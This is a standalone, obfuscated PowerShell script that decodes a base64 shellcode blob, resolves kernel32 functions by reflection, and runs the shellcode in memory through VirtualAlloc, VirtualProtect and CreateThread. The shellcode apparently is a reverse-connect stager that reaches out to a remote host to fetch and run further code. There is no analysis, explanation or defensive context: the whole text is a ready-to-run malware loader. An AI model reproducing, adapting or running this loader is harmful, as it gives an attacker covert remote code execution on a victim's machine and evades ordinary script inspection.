function ef {
        Param ($szZ, $bx1dI)
        $fG_ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $fG_.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fG_.GetMethod('GetModuleHandle')).Invoke($null, @($szZ)))), $bx1dI))
}

function mub {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $iUNDB,
                [Parameter(Position = 1)] [Type] $vFJSI = [Void]
        )

        $gpr = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $gpr.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $iUNDB).SetImplementationFlags('Runtime, Managed')
        $gpr.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vFJSI, $iUNDB).SetImplementationFlags('Runtime, Managed')

        return $gpr.CreateType()
}

[Byte[]]$xw2 = [System.Convert]::FromBase64String("/OiPAAAAYDHSZItSMInli1IMi1IUMf+LcigPt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQV4tCPAHQi0B4hcB0TAHQi1ggAdOLSBhQhcl0PEmLNIsx/wHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoCplTk2gCABFbieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V")
[Uint32]$lc2lk = 0
$vuAkv = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ef kernel32.dll VirtualAlloc), (mub @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $xw2.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($xw2, 0, $vuAkv, $xw2.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ef kernel32.dll VirtualProtect), (mub @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($vuAkv, [Uint32]$xw2.Length, 0x10, [Ref]$lc2lk)) -eq $true) {
        $ulfr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ef kernel32.dll CreateThread), (mub @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vuAkv,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ef kernel32.dll WaitForSingleObject), (mub @([IntPtr], [Int32]))).Invoke($ulfr,0xffffffff) | Out-Null
}
